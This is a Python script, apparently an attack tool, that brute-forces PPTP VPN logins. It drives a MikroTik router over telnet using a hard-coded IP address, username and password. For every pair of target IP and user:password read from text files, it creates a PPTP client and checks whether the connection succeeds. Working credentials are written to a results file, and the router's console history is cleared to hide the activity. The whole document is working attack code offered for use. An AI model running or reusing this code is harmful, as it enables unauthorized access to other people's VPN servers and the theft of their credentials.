
import sys, threading,os,time,telnetlib,re
import random, string
from queue import *



class TelMikro:
    def __init__(self):
        self.HOST = "185.158.251.126"
        self.port = 5051
        self.net = telnetlib.Telnet(self.HOST, self.port, timeout=10)
        self.getConicToMikro(self.net)

    def getConicToMikro(self, tn):

        try:
            def login():
                #print("\u001b[33;1m[+]  login to MikroTik \u001b[37m")
                user = "BotManTest"
                password = "BotManTest159357"
                # tn.read_until(b"Login: ")
                tn.write(user.encode('UTF-8') + b"\n")
                # input password
                tn.read_until(b"Password: ")
                tn.write(password.encode('UTF-8') + b"\n")
                tn.read_until(b")", 10)
                tn.write(b"\n" + b"\n")
            jackLoing = tn.read_until(b"Login: ")
            if "Login" in str(jackLoing):
                login()

        except:
            pass


    def addPptpCli(self, cicIp, PptpCliName, Username, Password):
        print(f"\u001b[33;1m[+] Trying == {cicIp} ==> {Username}:{Password} \u001b[37m")
        self.net.write(b"\r\n")
        self.net.read_until(b'>')
        mtcommand = "/interface pptp-client add connect-to=%s disabled=no name=%s password=%s user=%s" % (cicIp, PptpCliName, Password, Username)
        self.net.write(mtcommand.encode('UTF-8') + b"\r\n")
        time.sleep(5)


    def removPPtAIR(self, PptpCliName):
        # print("\u001b[31;1m[-] Start Removing Ip Routes and PPTP Cli from MikroTik \u001b[37m")
        mtcommand2 = f"/interface pptp-client remove [/interface find name=\"{PptpCliName}\"]"

        self.net.write(b"\r\n")
        time.sleep(1)
        self.net.read_until(b'>')
        self.net.write(mtcommand2.encode('UTF-8') + b"\r\n")
        self.net.write(b"\r\n")
        time.sleep(1)
        self.net.read_until(b'>')

    def chkPPCS(self, PptpCliName):
        # /interface pptp-client monitor "PPBPT"
        mtcommands = f"/interface pptp-client monitor \"{PptpCliName}\""
        for i in range(10):
            self.net.write(b"\r\n")
            self.net.read_until(b'>')
            time.sleep(1)
            self.net.write(mtcommands.encode('UTF-8') + b"\r\n")
            time.sleep(1)
            self.net.write(b"q\r\n")
            time.sleep(1)
            jackstat = self.net.read_until(b'Q quit')
            if "connected" in str(jackstat) and "disconnected" not in str(jackstat):
                return "GooD"
            elif (i ==  50) and "connected" not in str(jackstat):
                #print("\u001b[31;1m[-] PTP Cli Not Connected to MikroTik \u001b[37m")
                break
            #  console clear-history
            clsComm = "console clear-history"
            self.net.read_until(b'>')
            self.net.write(clsComm.encode('UTF-8') + b"\r\n")



    def CloseTelConToMikro(self):
        # print("\u001b[31;1m[-] Closing Telnet To : MikroTik \u001b[37m")
        self.net.close()


def StartCaracking(PPHost, PPUsername, PPPassword):
    try:
        GetwayName = ''.join(random.choices(string.ascii_letters + string.digits, k=8))


        try:
            jackM.addPptpCli(PPHost, GetwayName, PPUsername, PPPassword)
            jackMS = jackM.chkPPCS(GetwayName)

            if jackMS == "GooD":
                # PPTP Cli Connected
                # write Code here
                print(f"\u001b[32;1m[S] Connected == {PPHost} ==> {PPUsername}:{PPPassword} \u001b[37m")

                ValCrackRess.write(f"{PPHost} - {PPUsername}:{PPPassword}\n")
                ValCrackRess.flush()
        except:
            pass

        jackM.removPPtAIR(GetwayName)



    except:
        pass
class Hegaa(threading.Thread):

    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        while True:
            Host, UPs = self.queue.get()
            self.checker(Host, UPs)
            self.queue.task_done()

    def checker(self, Host, UPs):
        try:
            Puser = str(UPs).split(":")[0]
            Ppas = str(UPs).split(":")[1]

            StartCaracking(Host, Puser, Ppas)

        except:
            pass


def main(IPsList, UPsList, ThreadNmber):
    queue = Queue(maxsize=10000)
    for i in range(ThreadNmber):
        try:
            t = Hegaa(queue)
            t.daemon = True
            t.start()
        except Exception as e:
            break

    for UPs in UPsList:
        for Host in IPsList:
            queue.put((Host, UPs))

    queue.join()



with open('IPs.txt', 'r') as ipf:
    IPsList = ipf.read().splitlines()
with open('UPs.txt', 'r') as ipf:
    UPsList = ipf.read().splitlines()

ValCrackRess = open("CrackRes.txt", "a")
ThreadNumber = 15
jackM = TelMikro()
main(IPsList, UPsList, int(ThreadNumber))
jackM.CloseTelConToMikro()


